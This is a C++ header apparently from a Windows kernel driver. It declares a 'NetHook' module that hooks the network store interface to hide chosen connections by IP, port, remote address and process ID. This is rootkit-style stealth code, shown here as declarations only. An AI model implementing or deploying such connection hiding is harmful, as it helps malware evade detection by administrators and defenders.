#pragma once
#include "Ip2string.h"
#include "NetNSIHook.h"

#ifndef TAG_NET
#define TAG_NET 'TNET' 
#endif // !TAG_NET

namespace NetHook
{
	typedef struct _NETHOOK_HIDDEN_CONNECTION {
		ULONG IpAddress;
		USHORT Port;
		ULONG RemoteIpAddress;
		ULONG ConnectPID;
		USHORT _Unknown;    // For Future Use
	} NETHOOK_HIDDEN_CONNECTION, * PNETHOOK_HIDDEN_CONNECTION;


	typedef struct _NET_CONNECTION_ENTRY* PNET_CONNECTION_ENTRY;

	typedef struct _NET_CONNECTION_ENTRY {
		PNETHOOK_HIDDEN_CONNECTION Connection;
		PNET_CONNECTION_ENTRY NextEntry;
	} NET_CONNECTION_ENTRY, * PNET_CONNECTION_ENTRY;

	NTSTATUS InitNetworkHook();

	VOID NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection);

	VOID UnHookNetworkProxy();

	BOOLEAN NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG RemoteIpAddress, ULONG ConnectPID);
}

